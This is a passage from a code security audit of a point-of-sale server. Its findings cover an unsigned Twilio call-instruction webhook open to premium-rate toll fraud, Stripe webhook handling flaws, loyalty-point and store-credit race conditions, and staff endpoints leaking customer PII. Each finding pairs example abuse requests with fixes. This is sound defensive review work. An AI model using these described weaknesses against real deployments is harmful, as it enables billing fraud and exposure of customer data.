The `voiceInstructionsHandler` endpoint (`GET /api/v1/voice/instructions/:action`) returns TwiML/TeXML/BXML/NCCO call instructions to the telephony provider. Unlike the four other public voice webhooks (status, recording, transcription, inbound — all at lines 441, 498, 647, 729 of voice.routes.ts), this handler performs **no** `provider.verifyWebhookSignature` check. It reads `req.query.to` — an attacker-supplied phone number — and injects it into a `<Dial>` element. The endpoint is rate-limited to 60/min/IP (via `webhookRateLimit`) but is otherwise unauthenticated.

**Code:**
```typescript
// voice.routes.ts:694-713
export async function voiceInstructionsHandler(req: Request, res: Response): Promise<void> {
  const action = (req.params.action as string) || 'connect';
  const to = (req.query.to as string) || '';  // attacker-controlled
  // No verifyWebhookSignature call
  if (!provider.generateCallInstructions) {
    res.type('text/xml').send(`<Response><Dial>${escapeXml(to)}</Dial></Response>`);
    return;
  }
  const instructions = provider.generateCallInstructions(action, { to, ... });
  res.type('text/xml').send(instructions);
}
```

**Exploit:**
An attacker can call `GET /api/v1/voice/instructions/connect?to=%2B1900XXXXXXX` (a premium-rate number) — if Twilio fetches this URL during a real call and receives TwiML with the attacker's premium number in `<Dial>`, the call is bridged to that number, incurring charges against the merchant's Twilio account. This is the classic IRSV (International Revenue Share Fraud) attack pattern.

**Fix:**
Add `provider.verifyWebhookSignature` to `voiceInstructionsHandler` using the same pattern as the other voice webhook handlers. Additionally, validate `to` against a E.164 phone number regex before embedding it in TwiML.

---

### MEDIUM — No event-type allowlist: unknown Stripe events claim idempotency slot silently

**Where:** `packages/server/src/services/stripe.ts:744–754` (INSERT OR IGNORE), `packages/server/src/services/stripe.ts:757–1074` (switch, no `default:` rejection)

**What:**
`handleWebhookEvent` claims every event — including unrecognized types — via `INSERT OR IGNORE INTO stripe_webhook_events` before dispatching to the switch statement. The switch has no `default:` case. This means any Stripe event type that passes signature verification is permanently claimed in the idempotency table and silently dropped, with no log warning for unknown types, and no opportunity to detect unintended event types sent by mis-configured webhook endpoints (e.g. `charge.succeeded`, `balance.available`, or future Stripe event types that may carry tenant-relevant data).

**Code:**
```typescript
// stripe.ts:744-753
const claimResult = masterDb.prepare(
  `INSERT OR IGNORE INTO stripe_webhook_events (stripe_event_id, event_type, tenant_id)
   VALUES (?, ?, NULL)`
).run(event.id, event.type);  // Claims ALL types before type-checking

if (claimResult.changes === 0) { return { skip: true, tenantId: null }; }

switch (event.type) {
  case 'checkout.session.completed': { ... }
  // ... known events ...
  // No default: case — unknown types silently claimed and dropped
}
```

**Exploit:**
If a new Stripe event type (`e.g. customer.subscription.paused`) is introduced and contains tenant-relevant state, it will be silently consumed. Additionally, operators cannot easily detect when a webhook endpoint is misconfigured to receive unexpected events. Low direct exploitability but creates an observation blindspot.

**Fix:**
Add an explicit allowlist before the INSERT: `const HANDLED_EVENT_TYPES = new Set(['checkout.session.completed', 'customer.subscription.deleted', ...])`. If `!HANDLED_EVENT_TYPES.has(event.type)`, log a warning and return without claiming the idempotency slot. Also add a `default:` case in the switch to log unhandled-but-claimed events.

---

### LOW — BL1 replay window is double-applied with inconsistent semantics

**Where:** `packages/server/src/services/stripe.ts:89` (`WEBHOOK_MAX_AGE_SECONDS = 300`), `packages/server/src/services/stripe.ts:528` (`WEBHOOK_TOLERANCE_SECONDS = 300`), `packages/server/src/services/stripe.ts:711–733`

**What:**
Stripe signature verification (`verifyWebhook`) enforces a 300-second tolerance (`WEBHOOK_TOLERANCE_SECONDS`) on the `t=` timestamp in the `Stripe-Signature` header — this rejects payloads with a signature timestamp older than 5 minutes. Then, `handleWebhookEvent` runs a second 300-second check against `event.created` (the event's Stripe-side creation time). The two checks are semantically different: the signature timestamp is the delivery time; `event.created` is when the event originated in Stripe. These can diverge by minutes for events that Stripe queues internally before delivering. If `event.created` is more than 300 seconds before the delivery attempt (e.g. Stripe retried after a transient server failure), the second check will reject a legitimately signed retry even though `verifyWebhook` accepted it.

**Code:**
```typescript
const WEBHOOK_MAX_AGE_SECONDS = 300;          // handleWebhookEvent age check
const WEBHOOK_TOLERANCE_SECONDS = 300;         // verifyWebhook signature tolerance

// handleWebhookEvent:
const ageSeconds = nowSeconds - eventCreated;  // event.created, not sig timestamp
if (ageSeconds > WEBHOOK_MAX_AGE_SECONDS) {
  logger.error('Rejecting stale Stripe webhook (replay protection)', ...);
  return;  // drops legitimate Stripe retries if event.created > 5 min ago
}
```

**Exploit:**
No direct security exploit; the second check is more restrictive than needed and causes legitimate Stripe webhook retries to fail silently (Stripe retries over hours/days). The real replay protection is the signature timestamp checked by `verifyWebhook` + the `stripe_webhook_events` idempotency table. The `event.created` check adds no security value (signature timestamp is already verified) but does cause service disruption when Stripe retries events.

**Fix:**
Remove the `event.created` age check from `handleWebhookEvent` — the BL2 idempotency table is the correct replay guard, and `verifyWebhook`'s tolerance parameter covers the signature timestamp. If a secondary freshness check is desired, use a much wider window (e.g. 24 hours) and only log rather than reject.

---

### LOW — Stripe webhook `handleWebhookEvent` is not awaited — DB errors return HTTP 200

**Where:** `packages/server/src/routes/billing.routes.ts:110`

**What:**
`handleWebhookEvent(event)` is synchronous (uses better-sqlite3 which is sync), so this is not a correctness issue today. However, the call is not `await`-ed and there is no surrounding try/catch in `webhookHandler` beyond the outer catch block. If `handleWebhookEvent` ever throws (e.g. the master DB is `null` and the null-check on line 706 of stripe.ts is hit — `if (!masterDb) return;`), the throw propagates into the outer try/catch in `webhookHandler`, which correctly returns HTTP 400. But when `masterDb` is null, `handleWebhookEvent` silently returns rather than throwing, and the route still returns HTTP 200 (`{ received: true }`), causing Stripe to believe the event was processed when it was silently dropped.

**Code:**
```typescript
// billing.routes.ts:108-111
try {
  const event = verifyWebhook(req.body, sig);
  handleWebhookEvent(event);    // silent return if masterDb is null
  res.json({ received: true }); // Stripe thinks event was processed
} catch (e) { ... res.status(400)... }
```

**Exploit:**
In single-tenant mode or when the master DB fails to initialize, all Stripe webhook events are silently dropped with HTTP 200. Stripe stops retrying because it received 200. Subscription upgrades, cancellations, and payment failure handling are all lost.

**Fix:**
In `handleWebhookEvent`, throw when `masterDb` is null instead of silently returning: `if (!masterDb) throw new Error('Master DB not available — webhook cannot be processed');`. This causes the outer catch to return HTTP 500, triggering Stripe's retry queue.

---

### INFO — `retryDeliveryFailure` uses original stale timestamp for signature; receivers with freshness windows will reject

**Where:** `packages/server/src/services/webhooks.ts:517–591`

**What:**
When the operator retries a dead-lettered outbound webhook, `retryDeliveryFailure` re-uses the original `payload.timestamp` from the stored failure row to compute the HMAC signature. The comment notes this is intentional so the receiver can verify against a cached original signature. However, if the receiver enforces a freshness window (e.g. "reject signatures older than 5 minutes" — a common pattern for inbound webhook security), the retry will always fail regardless of network conditions. The dead-letter row will keep accumulating retries with no chance of success.

**Code:**
```typescript
// webhooks.ts:537-554
const parsed = JSON.parse(row.payload) as { timestamp?: string };
timestamp = parsed.timestamp;  // could be hours/days old
const signedInput = `${timestamp}.${row.payload}`;
const signature = crypto.createHmac('sha256', secret).update(signedInput).digest('hex');
// Retry with stale timestamp — rejected by freshness-enforcing receivers
```

**Exploit:**
No security impact — this is a reliability/usability issue. Dead-lettered events may be permanently undeliverable after 5+ minutes even when retried manually.

**Fix:**
On retry, generate a fresh `timestamp = new Date().toISOString()`, rebuild the payload with the new timestamp, recompute the signature, and deliver. Document that receivers must not cache signatures for replay detection (the `stripe_event_id` idempotency pattern is the right dedup mechanism, not signature caching).

---

## SCOPE CLEARED — items checked and found safe

- **Raw body parser order:** `express.raw({ type: 'application/json' })` is mounted at `index.ts:1212` *before* `express.json()` at line 1228. The Stripe SDK's `constructEvent` receives an unmodified `Buffer`. Order is correct.
- **Stripe webhook secret in logs:** `billing.routes.ts:118-122` logs only `hasSignature: !!sig` and a generic error message — no secret or signature bytes are emitted. The E4 fix specifically prevents echoing verification details.
- **Stripe webhook secret committed in repo:** `.env` is gitignored; `.env.example` uses placeholder values (`sk_test_...`, `whsec_...`). No live secrets in repo.
- **Event idempotency race:** `INSERT OR IGNORE` + `result.changes === 0` check (BL2) is race-safe under concurrent Stripe retries. The `stripe_webhook_events.stripe_event_id` PRIMARY KEY is the final dedup guarantee.
- **Cross-tenant attack via customer_id:** `checkout.session.completed` uses `client_reference_id` (set at Checkout creation to `tenantId`) for tenant lookup, not the customer ID from the event. The BL12 collision check additionally guards against a forged customer_id pointing to a different tenant.
- **Dunning reading body without re-fetching:** `dunningScheduler.ts` reads from the local `invoices` table, not from Stripe webhook bodies. It is entirely decoupled from Stripe webhook delivery.
- **BlockChyp callback handler:** `blockchyp.routes.ts` has no inbound callback route — BlockChyp is terminal-initiated (outbound only). No unsigned inbound callback surface found.
- **Twilio/SMS webhook signature:** All four SMS/voice inbound handlers (`smsInboundWebhookHandler`, `voiceStatusWebhookHandler`, `voiceRecordingWebhookHandler`, `voiceTranscriptionWebhookHandler`, `voiceInboundWebhookHandler`) call `provider.verifyWebhookSignature` with timing-safe comparison. Exception: `voiceInstructionsHandler` (reported above as MEDIUM).
- **SSRF in outbound webhooks:** `webhooks.ts` implements a thorough `assertWebhookUrl` with DNS resolution of all returned IPs, private range blocking, credential-in-URL rejection, and `redirect: 'error'` on fetch.


---

# S22-loyalty-counters

# S22 — Loyalty, Store Credit, Counters, Commissions

Audit date: 2026-05-05
Files examined: `packages/server/src/utils/loyalty.ts`, `utils/counters.ts`, `utils/commissions.ts`,
`utils/currency.ts`, `utils/validate.ts`, `services/notifications.ts`, `routes/invoices.routes.ts`,
`routes/refunds.routes.ts`, `routes/pos.routes.ts`, `routes/giftCards.routes.ts`,
`routes/tradeIns.routes.ts`, `routes/portal-enrich.routes.ts`, `routes/team.routes.ts`,
`db/migrations/028_gift_cards.sql`, `089_portal_enrichment.sql`, `109_store_credits_unique_customer.sql`,
`111_commissions_unique_non_reversal.sql`, `119_commissions_unique_invoice_non_reversal.sql`,
`072_counters_and_constraints.sql`, `db/db-worker.mjs`, `db/worker-pool.ts`, `db/async-db.ts`.

---

### HIGH — Loyalty points earned per payment with no idempotency guard: same invoice can be credited twice

**Where:** `packages/server/src/services/notifications.ts:45–89` (accruePaymentPoints), called from
`packages/server/src/routes/invoices.routes.ts:142` and `routes/pos.routes.ts:878,1308`

**What:**
`accruePaymentPoints` inserts a row into `loyalty_points` every time it is called. There is no UNIQUE
constraint on `(reference_type, reference_id)` in the `loyalty_points` table (migration 089 only adds a
non-unique index). The idempotency middleware (`X-Idempotency-Key`) is optional and client-supplied, so
an unauthenticated retry or a client that does not send the header will POST to `/:id/payments` a second
time, triggering a second `accruePaymentPoints` call for the same `invoiceId` and earning duplicate
loyalty points. The `writeLoyaltyPoints` function itself has no "already earned for this reference_id"
check.

**Code:**
```typescript
// notifications.ts:66-75
const points = computeEarnedPoints(paymentAmount, rate);
if (points <= 0) return 0;

await writeLoyaltyPoints(adb, {
  customer_id: customerId,
  points,
  reason: reason || `Payment on invoice #${invoiceId}`,
  reference_type: 'invoice',
  reference_id: invoiceId,   // ← no UNIQUE index → second call inserts second row
});
```

**Exploit:**
A cashier (or the customer via portal) submits payment for an invoice twice (network error + retry without
an idempotency key, or a double-click). Each request passes the double-submit guard (10-second window)
and calls `accruePaymentPoints`, inserting two earn rows for the same invoice — doubling the customer's
loyalty balance at zero additional cost.

**Fix:**
Add a UNIQUE partial index on `loyalty_points(reference_type, reference_id)` WHERE
`reference_type = 'invoice'` (migration), and wrap the `writeLoyaltyPoints` insert in an
`INSERT OR IGNORE` (or catch `SQLITE_CONSTRAINT_UNIQUE` in the caller) so duplicate calls for the same
invoice silently no-op. Alternatively, require and validate the `X-Idempotency-Key` header on all
payment endpoints.

---

### HIGH — `reverseLoyaltyPoints` is exported but never called: refund/void paths do not claw back loyalty points

**Where:** `packages/server/src/services/notifications.ts:112–167` (definition), `routes/refunds.routes.ts`
(approve path, lines 241–395), `routes/invoices.routes.ts` (void path, lines 874–954), `routes/pos.routes.ts`
(return path, lines 2496–2636)

**What:**
`reverseLoyaltyPoints` was implemented to claw back earned points when a refund or void is processed.
However, a global grep for all callers shows it is ONLY declared — it is never imported or invoked anywhere
in the codebase. The refund approval path in `refunds.routes.ts` reverses commissions (`reverseCommission`)
but makes zero loyalty calls. The invoice void path similarly skips loyalty reversal. The POS return
(`/pos/return`) also writes no loyalty row. As a result, a customer can earn points on a payment, then
obtain a full refund and keep the points permanently.

**Code:**
```typescript
// notifications.ts:112 — exported but never imported by any route
export async function reverseLoyaltyPoints(
  input: ReversePointsInput,
): Promise<number> { ... }

// refunds.routes.ts:342 — only commission reversal, no loyalty reversal
const reversedCount = await reverseCommission(adb, {
  sourceType: 'invoice',
  sourceId: refund.invoice_id,
  fraction: refundFraction,
  at: now(),
});
// <-- no call to reverseLoyaltyPoints here
```

**Exploit:**
Customer pays invoice → earns 100 loyalty points → requests refund → refund is approved → customer
receives their money back but retains 100 loyalty points. This is a monetary loss for the merchant on
every refunded transaction where the customer has loyalty enabled.

**Fix:**
Import `reverseLoyaltyPoints` in `refunds.routes.ts`, `invoices.routes.ts` (void path), and
`pos.routes.ts` (return path). Call it (best-effort, post-transaction) with the same `fraction`
proportional logic used by `reverseCommission`. Mirror the pattern: catch errors and log rather than
propagating to avoid rolling back an already-committed refund.

---

### MEDIUM — Store credit overpayment in `invoices.routes.ts` uses SELECT-then-UPDATE without ON CONFLICT

**Where:** `packages/server/src/routes/invoices.routes.ts:828–844`

**What:**
When an invoice payment results in an overpayment, the code reads the `store_credits` row for the
customer (`SELECT id, amount`) and then either UPDATEs or INSERTs. Although migration 109 added a
`UNIQUE(customer_id)` constraint to `store_credits`, the code performs this as two separate async
operations (`adb.get` followed by `adb.run`) outside any transaction, leaving a TOCTOU window. If two
concurrent overpayment flows for the same customer race, both may execute the SELECT (both see
`existingCredit = null`), and both INSERT, causing the second INSERT to fail with
`SQLITE_CONSTRAINT_UNIQUE` — which is then caught by the outer `try/catch` and silently logged, dropping
one of the store-credit grants. The `refunds.routes.ts` path (line 385) uses `ON CONFLICT DO UPDATE` and
is safe, but this invoice path does not.

**Code:**
```typescript
// invoices.routes.ts:828-844
const existingCredit = await adb.get<{ id: number; amount: number }>(
  'SELECT id, amount FROM store_credits WHERE customer_id = ?',
  invoice.customer_id,
);
if (existingCredit) {
  await adb.run(
    "UPDATE store_credits SET amount = ?, updated_at = ...",  // ← SET to computed value, not += delta
    roundCents((existingCredit.amount || 0) + overpayment),  // ← stale read risk
    existingCredit.id,
  );
} else {
  await adb.run('INSERT INTO store_credits (customer_id, amount) VALUES (?, ?)', ...);
  // ← no ON CONFLICT → fails silently if concurrent insert wins race
}
```

**Exploit:**
Two simultaneous overpayment payments (e.g. network retry or bulk-mark-paid loop) for the same customer.
Both see no existing row. First INSERT commits. Second INSERT fails silently → second overpayment amount
is lost. Additionally, if `existingCredit` is read stale (another concurrent update between SELECT and
UPDATE), the SET overwrites the concurrent write.

**Fix:**
Replace the two-step SELECT+UPDATE/INSERT with a single atomic `INSERT INTO store_credits ... ON CONFLICT(customer_id) DO UPDATE SET amount = amount + excluded.amount` (as already done in `refunds.routes.ts:385`). This removes the race entirely and matches the pattern already used on the safe path.

---

### MEDIUM — `reverseCommission` runs multiple awaited `adb.run` calls outside a transaction: concurrent reversal can interleave

**Where:** `packages/server/src/utils/commissions.ts:213–263`

**What:**
`reverseCommission` iterates over existing commission rows and calls `await adb.run(INSERT ...)` for each
one in a plain `for` loop — one async DB call per reversal row, with no wrapping transaction. Each
`adb.run` dispatches to a Piscina worker thread, which means a concurrent request running between
iterations could read the commission table in a partially-reversed state, or a payroll-lock check could
flip between the `isCommissionLocked` call and the first INSERT. On a ticket with 3 commission rows, 3
separate worker messages are sent; another thread could INSERT a new commission row between messages 1
and 2, which would then not be reversed.

**Code:**
```typescript
// commissions.ts:244-260
const clampedFraction = Math.min(1, Math.max(0, fraction));
let written = 0;
for (const row of rows) {
  const reversalAmount = roundCents(-row.amount * clampedFraction);
  if (reversalAmount === 0) continue;
  await adb.run(         // ← individual async call per row, outside a transaction
    `INSERT INTO commissions ...`,
    ...
  );
  written++;
}
```

**Exploit:**
A ticket with two commission rows is partially reversed. Between reversal INSERTs, a concurrent ticket
re-open writes a new forward commission row. That row escapes reversal. On a refund, the technician
receives a commission they should not.

**Fix:**
Collect all reversal `INSERT` params into an `adb.transaction(queries)` batch so all reversals commit
atomically (or all roll back). This is already the pattern used in `writeLoyaltyPoints` for the spend path.

---

### MEDIUM — `computeEarnedPoints` uses float × float: points for high-value invoices accumulate float error

**Where:** `packages/server/src/utils/loyalty.ts:183–190`

**What:**
`computeEarnedPoints(amountPaid, pointsPerDollar)` returns `Math.floor(amountPaid * pointsPerDollar)`.
Both inputs are JS `number` (float64). `amountPaid` comes from `validatePositiveAmount` which returns a
float dollar amount (e.g. `123.45`). For a $9999.99 invoice at 10 pts/$, the product is
`9999.99 * 10 = 99999.90000000001` in IEEE-754, floored to `99999` — correct here, but at extreme values
(e.g. `amountPaid = 999999.99`, `pointsPerDollar = 1000`) the product is `999999990` which fits in a
JS integer safely, but at `pointsPerDollar = 9007199` the product overflows `Number.MAX_SAFE_INTEGER`
silently, producing an incorrect integer. No upper bound is enforced on `pointsPerDollar` (it comes from
`store_config` as a raw `parseFloat`).

**Code:**
```typescript
// loyalty.ts:189
return Math.floor(amountPaid * pointsPerDollar);
// amountPaid = max 999999.99 (validatePositiveAmount cap)
// pointsPerDollar = uncapped parseFloat from store_config
// product can exceed Number.MAX_SAFE_INTEGER (2^53 - 1) with no error
```

**Exploit:**
An admin sets `portal_loyalty_rate` to a very large value (e.g. `9007199254741`). The next payment
results in `Math.floor(1 * 9007199254741) = 9007199254741` points written in a single ledger row —
which overflows `Number.MAX_SAFE_INTEGER` for larger rates, producing silently wrong points values and
potential integer truncation in the SQLite `INTEGER` column (SQLite integers cap at 64-bit signed).

**Fix:**
Validate `portal_loyalty_rate` on write (admin settings route) to be a positive integer in a sane range
(e.g. 1–10000). In `computeEarnedPoints`, also cap `pointsPerDollar` to a maximum before multiplication.
Consider keeping the computation in integer space: `Math.floor((Math.round(amountPaid * 100) * pointsPerDollar) / 100)`.

---

### MEDIUM — Loyalty reversal TOCTOU: `reverseLoyaltyPoints` reads balance then calls `writeLoyaltyPoints` in separate async round-trips

**Where:** `packages/server/src/services/notifications.ts:120–145`

**What:**
`reverseLoyaltyPoints` reads the current balance with one `adb.get` (SELECT SUM), then calls
`writeLoyaltyPoints` (which itself runs a conditional INSERT). Between the SELECT and the INSERT, a
concurrent redemption (spend) could drain the balance to zero. The `writeLoyaltyPoints` spend path does
guard against going negative (atomic conditional INSERT), but the `reverseLoyaltyPoints` function
computes `toReverse = Math.min(current, Math.floor(points))` using the stale `current` value, then
calls the spend path with `points: -toReverse`. If the balance dropped to 0 between the read and the
write, the spend path's conditional INSERT rejects with `Insufficient loyalty balance` (throws an error),
which is caught and swallowed by the outer try/catch in `reverseLoyaltyPoints` — causing the reversal to
silently succeed (return 0 reversed) without actually reversing anything. The fix is moot since
`reverseLoyaltyPoints` is never called (see finding above), but documenting for when it is wired in.

**Code:**
```typescript
// notifications.ts:120-136
const balanceRow = await adb.get<...>(
  `SELECT COALESCE(SUM(points), 0) AS balance FROM loyalty_points WHERE customer_id = ?`,
  customerId,
);
const current = Number(balanceRow?.balance ?? 0);
// ... concurrent redemption can drain `current` to 0 here ...
const toReverse = Math.min(current, Math.floor(points));
await writeLoyaltyPoints(adb, { points: -toReverse, ... });  // may throw if balance changed
```

**Exploit:**
Customer earns 100 points. Refund is initiated. Simultaneously, customer redeems 100 points via portal.
The reversal reads balance=100, the redemption commits -100, the reversal then tries to write -100 (but
balance is now 0) → conditional INSERT rejects → reversal is silently dropped. Customer redeems their
earned points AND gets the refund, keeping both.

**Fix:**
Use the same atomic conditional INSERT approach already in `writeLoyaltyPoints` for the reversal path,
but clamp the reversal inside SQLite rather than in JS: `INSERT ... SELECT -MIN(SUM(points), ?) WHERE
SUM(points) > 0`. This makes the clamping and the write atomic.

---

### LOW — `tradeIns.routes.ts` comment incorrectly claims store_credits has no UNIQUE constraint; SELECT-then-INSERT outside transaction

**Where:** `packages/server/src/routes/tradeIns.routes.ts:296–337`

**What:**
The comment at line 296 states "store_credits has no UNIQUE(customer_id) constraint". This was true
before migration 109, which added `CREATE UNIQUE INDEX idx_store_credits_customer_unique ON
store_credits(customer_id)`. The actual code performs an `adb.get` to check for an existing row, then
queues either an UPDATE or INSERT into a transaction batch — a pattern that can still race if two
concurrent trade-in accepts fire for the same customer, both see no existing credit row, and both queue
an INSERT. The UNIQUE constraint introduced in migration 109 will cause the second INSERT to fail and
roll back the entire transaction, which is better than silent corruption but loses the credit for the
customer. Additionally, the UPDATE uses `amount + ?` (delta), not a SET-to-computed-value — so that
path is race-safe. Only the INSERT path is at risk.

**Code:**
```typescript
// tradeIns.routes.ts:305-321
const existingCredit = await adb.get<{ id: number }>(
  'SELECT id FROM store_credits WHERE customer_id = ?',
  existing.customer_id,
);
if (existingCredit) {
  tx.push({ sql: 'UPDATE store_credits SET amount = amount + ? ... WHERE id = ?', ... }); // safe
} else {
  tx.push({ sql: 'INSERT INTO store_credits (customer_id, amount, ...) VALUES (?, ?, ...)', ... });
  // ← will fail with UNIQUE violation under concurrent trade-in accepts; tx rolls back, credit lost
}
```

**Exploit:**
Two trade-in accept requests for the same customer race. Both see no existing row. Both queue an INSERT.
The second INSERT hits the UNIQUE constraint, rolling back the trade-in status update and the store
credit — leaving the trade-in in an inconsistent state.

**Fix:**
Replace the SELECT+INSERT/UPDATE pattern with `INSERT INTO store_credits ... ON CONFLICT(customer_id)
DO UPDATE SET amount = amount + excluded.amount`, mirroring `refunds.routes.ts:385`. Update the stale
comment to note the UNIQUE constraint added in migration 109.

---

### LOW — Commission `computeCommissionCents`: `rate` stored as float percentage (e.g. 10.5) is converted to bps with `Math.round(rate * 100)` — rounding hazard at high rate values

**Where:** `packages/server/src/utils/commissions.ts:126`

**What:**
`commission_rate` is stored in the DB as a float (`REAL`, migration 017). `computeCommissionCents`
converts the percentage to basis points with `Math.round(rate * 100)`. For `rate = 10.1`,
`10.1 * 100 = 1009.9999...` rounds to `1010 bps` (10.10%) rather than `1010 bps` — this is correct.
However, for `rate = 10.7`, `10.7 * 100 = 1070.0000000001` rounds correctly, but for some IEEE-754
edge cases (e.g. `rate = 49.9`, `49.9 * 100 = 4990.000000001`) the rounding is correct. The actual
residual risk is that there is no enforcement of an upper bound on `commission_rate` — a value > 100
(e.g. `commission_rate = 150`) produces `15000 bps` and `calcCommissionCents` would apply a 150%
commission rate, paying the technician more than the invoice total. There is no route that validates
`commission_rate <= 100` before writing it.

**Code:**
```typescript
// commissions.ts:126
const rateBps = Math.round(rate * 100);  // rate = DB float, no upper bound enforced
return calcCommissionCents(rateBps, Math.max(0, commissionableCents));
// If rate = 150.0, rateBps = 15000, commission = 1.5x the commissionable base
```

**Exploit:**
An admin (or a compromised admin account) sets a technician's `commission_rate` to 150. On a $1000
ticket, the technician earns $1500 in commissions. No server-side validation on the write path prevents
this. The DB column has no `CHECK(commission_rate BETWEEN 0 AND 100)` constraint.

**Fix:**
Add validation on the user-edit path (wherever `commission_rate` is written, which appears to be only
via direct DB update or future settings route) to reject values outside `[0, 100]`. Add a DB CHECK
constraint in a migration: `ALTER TABLE users ADD CHECK(commission_rate BETWEEN 0 AND 200)` (or a
tighter 0–100 range, noting flat rates are in dollars not percent). Add the check in
`computeCommissionCents`: if `type` is `percent_ticket/percent_service` and `rate > 100`, clamp or throw.

---

### INFO — `currency.ts` is a thin one-liner; arithmetic safety relies entirely on callers using `roundCents` from `validate.ts`

**Where:** `packages/server/src/utils/currency.ts:1–4`

**What:**
The `currency.ts` module exports only `roundCurrency(value)` (two-decimal round). The real arithmetic
safety helpers (`roundCents`, `toCents`, `fromCents`) live in `validate.ts`. Multiple call sites across
the codebase import from different places — `roundCurrency` from `currency.ts` in `giftCards.routes.ts`
and `roundCents` from `validate.ts` in commissions and invoices routes. Both do the same `Math.round(v *
100) / 100` computation. The split creates a risk that a new developer adds a currency operation using
`roundCurrency` (which operates on dollar floats) instead of keeping everything in integer cents.

**Code:**
```typescript
// currency.ts:1-4 — entire file
export function roundCurrency(value: number): number {
  return Math.round(value * 100) / 100;
}
```

**Fix:**
Consolidate `roundCurrency` into `validate.ts` (or vice versa) so there is a single canonical money
utility module. Mark `currency.ts` as deprecated and update callers. Consider adding a lint rule or
barrel export to enforce the single import point.

---

### INFO — No DB-level unique constraint on `loyalty_points(customer_id, reference_type, reference_id)` to prevent double-earn at DB layer

**Where:** `packages/server/src/db/migrations/089_portal_enrichment.sql:44–55`

**What:**
The `loyalty_points` table has only a non-unique composite index on `(reference_type, reference_id)`.
There is no uniqueness constraint preventing two earn rows with the same `(customer_id, reference_type,
reference_id)` tuple. Application-level guards (idempotency middleware) are optional. Commission rows
have UNIQUE partial indexes (migrations 111 and 119) protecting against double-write — no equivalent
protection exists for loyalty points.

**Fix:**
Add `CREATE UNIQUE INDEX IF NOT EXISTS idx_loyalty_points_reference_unique ON loyalty_points(customer_id, reference_type, reference_id) WHERE reference_type IN ('invoice', 'referral')` and update `writeLoyaltyPoints` to use `INSERT OR IGNORE` (earn path) so idempotent calls are no-ops rather than errors. Redemption and manual rows should remain unconstrained.

---


---

# S23-pii

# S23 — PII Exposure: Customer / Search / Audit / Activity / Portal Endpoints

---

### [MEDIUM] portal_pin hash returned in customer detail and list API to all staff

**Where:** `packages/server/src/routes/customers.routes.ts:194` (list), `packages/server/src/routes/customers.routes.ts:1206` (GET /:id)

**What:**
Both `GET /api/v1/customers` and `GET /api/v1/customers/:id` execute `SELECT c.*` which includes the `portal_pin` column (bcrypt hash of customer's portal PIN, added in migration 041). The full `c.*` row is returned verbatim to any authenticated staff user regardless of role. Likewise, the customers table schema (migration 001, lines 97–100) includes `driving_license`, `license_image`, `id_type`, `id_number`, and `tax_number` columns that would be returned by `c.*` if populated.

**Code:**
```typescript
// GET /customers list — customers.routes.ts:194
const dataSql = `
  SELECT
    c.*,
    cg.name AS customer_group_name,
    ...
  FROM customers c
  ...
`;
// GET /customers/:id — customers.routes.ts:1206
const customer = await adb.get<AnyRow>(
  `SELECT c.*,
          ...
   FROM customers c
   WHERE c.id = ? AND c.is_deleted = 0`,
  id);
res.json({ success: true, data: { ...(customer as any), phones, emails, ... } });
```

**Exploit:**
A technician-role staff member sends `GET /api/v1/customers/42`. The JSON response includes `portal_pin: "$2b$12$..."` (bcrypt hash). While bcrypt is slow to crack, the hash is sufficient to confirm a PIN was set, and the hash can be taken offline for brute-force. For customers with `id_number` or `driving_license` populated, those identity document values are also exposed in the same response.

**Fix:**
Replace `SELECT c.*` with an explicit column allowlist that excludes `portal_pin`, `driving_license`, `license_image`, `id_type`, `id_number`, and `tax_number` from general list/detail endpoints. Expose `tax_number` only to admin/manager roles and gate any government-ID fields behind `requirePermission('customers.view_sensitive')`.

---

### [MEDIUM] GET /customers/repeat exposes email and phone to any authenticated user

**Where:** `packages/server/src/routes/customers.routes.ts:1172`

**What:**
The `GET /customers/repeat` endpoint returns a list of repeat customers including `email`, `phone`, and `mobile` columns. Unlike all write operations and the import endpoint, this read endpoint has no `requirePermission` call and no inline role check. Any authenticated user (including technician role) can enumerate every customer who visited 3+ times in the last 12 months with their contact details.

**Code:**
```typescript
router.get(
  '/repeat',
  asyncHandler(async (req, res) => {
    const customers = await adb.all<AnyRow>(`
      SELECT c.id, c.first_name, c.last_name, c.email, c.phone, c.mobile,
             c.organization, c.code,
             COUNT(t.id) AS ticket_count, ...
      FROM customers c
      ...
    `);
    res.json({ success: true, data: customers });  // no role gate
  }),
);
```

**Exploit:**
An authenticated technician with no `customers.view` permission calls `GET /api/v1/customers/repeat?months=120&min_tickets=1`, receiving a dump of all customer emails and phone numbers from the past 10 years.

**Fix:**
Add `requirePermission('customers.view')` (or equivalent admin/manager role check) to the `/repeat` route handler, matching the pattern used by `POST /import-csv` and `POST /merge`.

---

### [MEDIUM] GET /inbox/retry-queue exposes customer phone numbers and SMS text to all staff

**Where:** `packages/server/src/routes/inbox.routes.ts:733`

**What:**
`GET /inbox/retry-queue` returns up to 200 queued SMS records including `to_phone` (full customer phone number) and `body` (full SMS message text) with no role guard. The endpoint is mounted under `authMiddleware` but has no inline role check, unlike `POST /bulk-send` which calls `requireAdmin()`. Any technician can read every phone number and outbound message content queued for retry.

**Code:**
```typescript
router.get(
  '/retry-queue',
  asyncHandler(async (req, res) => {
    const rows = await adb.all<...>(
      `SELECT id, original_message_id, to_phone, body, retry_count, next_retry_at,
              last_error, status, created_at
         FROM sms_retry_queue
        WHERE status IN ('pending','failed')
        ORDER BY next_retry_at ASC
        LIMIT 200`,
    );  // No role check here or at route definition
    res.json({ success: true, data: safeRows });
  }),
);
```

**Exploit:**
A technician calls `GET /api/v1/inbox/retry-queue` and receives up to 200 customer phone numbers and the text of queued marketing/transactional SMS messages they are not authorized to see.

**Fix:**
Add `requireAdmin(req)` (or admin/manager role check) at the top of the `/retry-queue` GET handler and both `/retry-queue/:id/retry` and `/retry-queue/:id/cancel` handlers, matching the protection level of `POST /bulk-send`.

---

### [LOW] portal-enrich v2 auth skips 4-hour idle-timeout enforced by v1 portal

**Where:** `packages/server/src/routes/portal-enrich.routes.ts:65` vs `packages/server/src/routes/portal.routes.ts:126`

**What:**
The `portalAuth` in `portal.routes.ts` enforces a 4-hour idle timeout by checking `last_used_at` and evicts stale sessions by deleting the row. The `portalAuth` in `portal-enrich.routes.ts` only checks `expires_at > datetime('now')` and never updates `last_used_at`. A customer session that has been idle for over 4 hours will be rejected by v1 portal endpoints but accepted by all v2 portal-enrich endpoints (`/portal/api/v2/*`), including ticket timeline, photos, warranty PDF, and review submission.

**Code:**
```typescript
// portal-enrich.routes.ts:82 — no idle check, no last_used_at update
